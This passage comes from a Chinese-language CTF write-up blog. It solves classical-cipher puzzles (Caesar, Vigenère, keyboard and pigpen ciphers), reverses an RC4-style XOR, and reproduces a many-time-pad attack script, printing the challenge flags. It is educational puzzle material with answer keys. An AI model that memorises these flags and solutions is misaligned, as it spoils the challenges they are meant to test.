class="line"><span class="string">01000111 01101000 01101110 01011010 01000011 01000010 00110001 01011010 01111001 01000010 00110110 01100011 00110010 </span></span><br><span class="line"><span class="string">01010101 01100111 01100011 00110010 01001110 01101011 01100001 00110011 01100111 01100111 01100011 00110011 01101100 </span></span><br><span class="line"><span class="string">00110101 01001100 01101001 01000010 01110000 01011010 00110010 01111000 01110010 01001001 01001000 01000110 01101110 </span></span><br><span class="line"><span class="string">01011010 01101001 01000010 01110010 01100001 01001000 01000010 01101110 01100011 01010111 01110100 01101100 01001001 </span></span><br><span class="line"><span class="string">01000111 01010010 01110000 01100001 01111001 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 </span></span><br><span class="line"><span class="string">01110100 01101111 01100010 01101101 01110011 01101000&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)))).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">0</span>])</span><br><span class="line">plaintext = base64.b64decode(t[<span class="number">1</span>])</span><br><span class="line">kaisa = <span class="string">&quot;kvbsqrd, iye&#x27;bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S&#x27;fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd &#x27;o&#x27; crygc ez wycd ypdox sx dro kvzrklod, cy drkd&#x27;c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li &#x27;d&#x27;, kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo.&quot;</span></span><br><span class="line">cipin = <span class="string">&quot;rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> kaisa:</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j) + i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[<span class="subst">&#123;i&#125;</span>] &#x27;</span> + tmp)</span><br></pre></td></tr></table></figure><p>转十进制，转char，转base64，最后看出来flag那部分是词频分析，直接在线quipquip解得</p><p><img src="/2021/05/28/CTF//image-20210726210941538.png"></p><p><code>flag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;</code></p><h4 id="ACTF新生赛2020-crypto-classic1"><a href="#ACTF新生赛2020-crypto-classic1" class="headerlink" title="[ACTF新生赛2020]crypto-classic1"></a>[ACTF新生赛2020]crypto-classic1</h4><p><strong>TAG: 键盘密码， 维吉尼亚</strong></p><p>先是键盘密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律</span><br><span class="line">xdfv ujko98 edft54 xdfv pok,.; wsdr43</span><br><span class="line">circle</span><br></pre></td></tr></table></figure><p>得压缩包内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;</span><br><span class="line">解维吉尼亚得.密钥为sp</span><br><span class="line">我没解出来，看大哥写的脚本</span><br></pre></td></tr></table></figure><p>大哥写的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#破解key</span></span><br><span class="line">s=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> </span><br><span class="line">s1=<span class="string">&#x27;ACTF&#x27;</span> </span><br><span class="line">s2=<span class="string">&#x27;SRLU&#x27;</span> </span><br><span class="line">key =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)): </span><br><span class="line">    key+=s[(s.find(s2[i])-s.find(s1[i]))%<span class="number">26</span>] </span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line">cipher = <span class="string">&#x27;SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;SP&#x27;</span></span><br><span class="line"><span class="comment">#decode</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line">flag += table[(table.find(cipher[i])+<span class="number">26</span>-table.find(key[i%<span class="built_in">len</span>(key)]))%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="comment">#ACTFHWHATKAKCLASSICALKVIGENEREH</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cipher = SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;</span></span><br><span class="line"><span class="string">ACTF&#123;WHAT_A_CLASSICAL_VIGENERE&#125;</span></span><br><span class="line"><span class="string">flag&#123;what_a_classical_vigenere&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="NPUCTF2020-Classical-Cipher"><a href="#NPUCTF2020-Classical-Cipher" class="headerlink" title="[NPUCTF2020]Classical Cipher"></a>[NPUCTF2020]Classical Cipher</h4><p><strong>TAG: 词频分析、符号密码</strong></p><p><img src="/2021/05/28/CTF//image-20210727142612399.png"></p><p>找出来key，然后获得一张图片，猪圈密码看得出来，那个动物的那个不知道是什么加密了，猜猜就好了。</p><p><img src="/2021/05/28/CTF//image-20210727142847265.png"></p><p><img src="/2021/05/28/CTF//image-20210727143845598.png" alt="变形猪圈"></p><p><img src="/2021/05/28/CTF//image-20210727145244333.png" alt="符号解密"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;classicalcode&#125;</span><br></pre></td></tr></table></figure><h3 id="普通异或加密"><a href="#普通异或加密" class="headerlink" title="普通异或加密"></a>普通异或加密</h3><h4 id="EasyProgram"><a href="#EasyProgram" class="headerlink" title="EasyProgram"></a>EasyProgram</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">get buf unsign s[256]</span><br><span class="line">get buf t[256]</span><br><span class="line">we have key:whoami</span><br><span class="line">we have flag:????????????????????????????????</span><br><span class="line"></span><br><span class="line">for i:0 to 256</span><br><span class="line">    set s[i]:i</span><br><span class="line"></span><br><span class="line">for i:0 to 256</span><br><span class="line">    set t[i]:key[(i)mod(key.lenth)]</span><br><span class="line"></span><br><span class="line">for i:0 to 256</span><br><span class="line">    set j:(j+s[i]+t[i])mod(256)</span><br><span class="line">        swap:s[i],s[j]</span><br><span class="line"></span><br><span class="line">for m:0 to 38</span><br><span class="line">    set i:(i + 1)mod(256)</span><br><span class="line">    set j:(j + S[i])mod(256)</span><br><span class="line">    swap:s[i],s[j]</span><br><span class="line">    set x:(s[i] + (s[j]mod(256))mod(256))</span><br><span class="line">    set flag[m]:flag[m]^s[x]</span><br><span class="line"></span><br><span class="line">fprint flagx to file</span><br></pre></td></tr></table></figure><p>分析一下上面的伪代码<code>set flag[m]:flag[m]^s[x]</code>，只有这一句有flag参与了运算，根据异或运算的可逆性，这里我们只需要获得<code>s[x]</code>就能进而获得flag的内容了。写出逆代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">t = []</span><br><span class="line">key = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ciphertext = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    tmp = <span class="built_in">str</span>(binascii.b2a_hex(file.read()))</span><br><span class="line">    tmp = tmp[<span class="number">2</span>:<span class="built_in">len</span>(tmp)-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tmp), <span class="number">2</span>):</span><br><span class="line">        temp = <span class="string">&#x27;0x&#x27;</span> + tmp[i:i+<span class="number">2</span>]</span><br><span class="line">        ciphertext.append(<span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    s.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    t.append(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s[i] + <span class="built_in">ord</span>(t[i])) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    i = (i + <span class="number">1</span>) % (<span class="number">256</span>)</span><br><span class="line">    j = (j + s[i]) % (<span class="number">256</span>)</span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">    x = (s[i] + (s[j] % <span class="number">256</span>)) % <span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ciphertext[m] ^ s[x])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;f238yu28323uf28u2yef2ud8uf289euf&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一次一密"><a href="#一次一密" class="headerlink" title="一次一密"></a>一次一密</h3><blockquote><p>题目类型应该以buu上的<code>你听说过一次一密么？</code>这道题目开始的，此类题目有一种共同的解法，因此将其分为一类。英文名应该是叫做<code>many-time-pad-attack</code>这种攻击。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">&#x27;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&#x27;</span></span><br><span class="line">c3 = <span class="string">&#x27;1203075429152a7020365c167f390f1013170b1006481e1314&#x27;</span></span><br><span class="line">c4 = <span class="string">&#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&#x27;</span></span><br><span class="line">c5 = <span class="string">&#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&#x27;</span></span><br><span class="line">c6 = <span class="string">&#x27;0909075412132e247436425332281a1c561f04071d520f0b11&#x27;</span></span><br><span class="line">c7 = <span class="string">&#x27;4116111b101e2170203011113a69001b475206011552050219&#x27;</span></span><br><span class="line">c8 = <span class="string">&#x27;041006064612297020375453342c17545a01451811411a470e&#x27;</span></span><br><span class="line">c9 = <span class="string">&#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&#x27;</span></span><br><span class="line">c10 = <span class="string">&#x27;06140611460c26243c7f5c167f3d015446010053005907145d&#x27;</span></span><br><span class="line">c11 = <span class="string">&#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&#x27;</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line"><span class="comment"># target_cipher = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):  <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_fix</span>(<span class="params">target_cipher</span>):</span><br><span class="line">    <span class="comment"># To store the final key</span></span><br><span class="line">    final_key = [<span class="literal">None</span>] * <span class="number">150</span></span><br><span class="line">    <span class="comment"># To store the positions we know are broken</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For each ciphertext</span></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="comment"># for each other ciphertext</span></span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:  <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(</span><br><span class="line">                        strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):  <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">                    <span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[</span><br><span class="line">                        indexOfChar] += <span class="number">1</span>  <span class="comment"># Increment the counter at this index</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">        <span class="comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), <span class="string">&#x27; &#x27;</span> * <span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            <span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            <span class="comment"># Record that we known the key at this position</span></span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    <span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>), final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)]) + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># WAIT.. MANUAL STEP HERE</span></span><br><span class="line">    <span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line">    <span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line">    <span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line">    <span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">    target_plaintext = <span class="string">&quot;cure, Let Me know if you a&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> target_plaintext + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line">    key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>), target_plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        <span class="built_in">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>), key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;nPrivate key recovered: &quot;</span> + key + <span class="string">&quot;n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><h4 id="AFCTF2018-你听过一次一密么"><a href="#AFCTF2018-你听过一次一密么" class="headerlink" title="[AFCTF2018]你听过一次一密么?"></a>[AFCTF2018]你听过一次一密么?</h4><p>将上面的脚本稍作修改，既数据修改一下即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">&#x27;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&#x27;</span></span><br><span class="line">c3 = <span class="string">&#x27;1203075429152a7020365c167f390f1013170b1006481e1314&#x27;</span></span><br><span class="line">c4 = <span class="string">&#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&#x27;</span></span><br><span class="line">c5 = <span class="string">&#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&#x27;</span></span><br><span class="line">c6 = <span class="string">&#x27;0909075412132e247436425332281a1c561f04071d520f0b11&#x27;</span></span><br><span class="line">c7 = <span class="string">&#x27;4116111b101e2170203011113a69001b475206011552050219&#x27;</span></span><br><span class="line">c8 = <span class="string">&#x27;041006064612297020375453342c17545a01451811411a470e&#x27;</span></span><br><span class="line">c9 = <span class="string">&#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&#x27;</span></span><br><span class="line">c10 = <span class="string">&#x27;06140611460c26243c7f5c167f3d015446010053005907145d&#x27;</span></span><br><span class="line">c11 = <span class="string">&#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&#x27;</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line"><span class="comment"># target_cipher = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):  <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_fix</span>(<span class="params">target_cipher</span>):</span><br><span class="line">    <span class="comment"># To store the final key</span></span><br><span class="line">    final_key 